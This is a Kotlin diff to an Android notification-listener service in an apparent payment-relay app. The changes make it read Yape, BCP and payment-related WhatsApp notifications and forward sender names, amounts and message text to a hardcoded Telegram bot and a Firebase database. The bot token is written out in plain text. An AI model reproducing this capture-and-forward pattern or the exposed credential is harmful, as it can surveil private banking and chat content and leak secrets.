@@ -41,24 +41,32 @@ class StarkCaptureService : NotificationListenerService() {
 
     private fun createPersistentNotification(): Notification {
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("WING Telegram Bridge Activo")
-            .setContentText("Retransmitiendo flujos de pago...")
+            .setContentTitle("WING Triple Enlace Activo")
+            .setContentText("Vigilando Yape, BCP y WhatsApp...")
             .setSmallIcon(android.R.drawable.ic_dialog_info)
             .build()
     }
 
     override fun onNotificationPosted(sbn: StatusBarNotification) {
         val pkg = sbn.packageName
+        val extras = sbn.notification.extras
+        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
+        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
+        val fullContent = "$title $text"
+        
+        val notificationId = sbn.postTime.toString() + sbn.id
+        if (processedNotifications.contains(notificationId)) return
+        processedNotifications.add(notificationId)
+
+        // 1. DETECCIÓN BANCARIA DIRECTA (Yape/BCP)
         if (pkg.contains("yape") || pkg.contains("bcp")) {
-            val extras = sbn.notification.extras
-            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""
-            val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""
-            val fullContent = "$title $text"
-            
-            val notificationId = sbn.postTime.toString() + sbn.id
-            if (!processedNotifications.contains(notificationId)) {
-                processedNotifications.add(notificationId)
-                processPayment(fullContent, pkg)
+            processPayment(fullContent, pkg)
+        } 
+        // 2. DETECCIÓN WHATSAPP (Filtro de Pagos)
+        else if (pkg.contains("whatsapp")) {
+            val lowerContent = fullContent.lowercase()
+            if (lowerContent.contains("yape") || lowerContent.contains("bcp") || lowerContent.contains("pago") || lowerContent.contains("transferencia")) {
+                processWhatsAppPayment(title, text)
             }
         }
     }
@@ -72,50 +80,44 @@ class StarkCaptureService : NotificationListenerService() {
             val nombre = content.replace(matcher.group(0)!!, "").replace("¡Yapeaste!", "").replace("te envió", "").trim()
             val banco = if(pkg.contains("yape")) "YAPE" else "BCP"
 
-            val msgTelegram = "🚀 *NUEVO PAGO DETECTADO*\n\n💰 *Monto:* S/ $monto\n👤 *De:* $nombre\n🏦 *Banco:* $banco\n\n_Retransmitido por WingPay v40.0_"
-
+            val msgTelegram = "🚀 *PAGO BANCARIO DETECTADO*\n\n💰 *Monto:* S/ $monto\n👤 *De:* $nombre\n🏦 *Banco:* $banco"
+            
             serviceScope.launch {
-                // 1. Enviar a Firebase (Como respaldo)
-                postToFirebase(monto, nombre, banco)
-                // 2. Enviar a TELEGRAM (Puente Principal)
                 sendToTelegram(msgTelegram)
+                postToFirebase("PAYMENT", monto, nombre, banco)
             }
         }
     }
 
-    private fun sendToTelegram(message: String) {
-        val prefs = getSharedPreferences("STARK_PREFS", Context.MODE_PRIVATE)
-        val token = "8629465941:AAH-5rwmNDTP_91UKZIRrJO_oZ24p1IcIQE"
-        val chatId = "8502345704"
-
-        if (token.isNotEmpty() && chatId.isNotEmpty()) {
-            try {
-                val url = URL("https://api.telegram.org/bot$token/sendMessage")
-                val conn = url.openConnection() as HttpURLConnection
-                conn.requestMethod = "POST"
-                conn.doOutput = true
-                conn.setRequestProperty("Content-Type", "application/json")
-                
-                val body = JSONObject().apply {
-                    put("chat_id", chatId)
-                    put("text", message)
-                    put("parse_mode", "Markdown")
-                }
-
-                OutputStreamWriter(conn.outputStream).use { it.write(body.toString()); it.flush() }
-                conn.responseCode
-                conn.disconnect()
-            } catch (e: Exception) { Log.e("TG_BRIDGE", "Error: ${e.message}") }
+    private fun processWhatsAppPayment(sender: String, message: String) {
+        val msgTelegram = "🟢 *REPORTE WHATSAPP*\n\n👤 *De:* $sender\n💬 *Mensaje:* $message\n\n_Filtro de pago activado_"
+        
+        serviceScope.launch {
+            sendToTelegram(msgTelegram)
+            postToFirebase("WHATSAPP_PAY", "0.00", sender, message)
         }
     }
 
-    private fun postToFirebase(monto: String, nombre: String, banco: String) {
+    private fun sendToTelegram(message: String) {
+        val token = "8629465941:AAH-5rwmNDTP_91UKZIRrJO_oZ24p1IcIQE"
+        val chatId = "8502345704"
+        try {
+            val url = URL("https://api.telegram.org/bot$token/sendMessage")
+            val conn = url.openConnection() as HttpURLConnection
+            conn.requestMethod = "POST"; conn.doOutput = true; conn.setRequestProperty("Content-Type", "application/json")
+            val body = JSONObject().apply { put("chat_id", chatId); put("text", message); put("parse_mode", "Markdown") }
+            OutputStreamWriter(conn.outputStream).use { it.write(body.toString()); it.flush() }
+            conn.responseCode; conn.disconnect()
+        } catch (e: Exception) {}
+    }
+
+    private fun postToFirebase(type: String, monto: String, nombre: String, content: String) {
         val myId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
         val urlStr = "https://wingpaymirror-default-rtdb.firebaseio.com/hives/$myId.json"
         try {
             val body = JSONObject().apply {
-                put("type", "PAYMENT"); put("nombre", nombre); put("monto", monto)
-                put("timestamp", System.currentTimeMillis()); put("user", "SISTEMA"); put("banco", banco)
+                put("type", type); put("nombre", nombre); put("monto", monto)
+                put("timestamp", System.currentTimeMillis()); put("user", "SISTEMA"); put("content", content)
             }
             val conn = URL(urlStr).openConnection() as HttpURLConnection
             conn.requestMethod = "POST"; conn.doOutput = true; conn.setRequestProperty("Content-Type", "application/json")
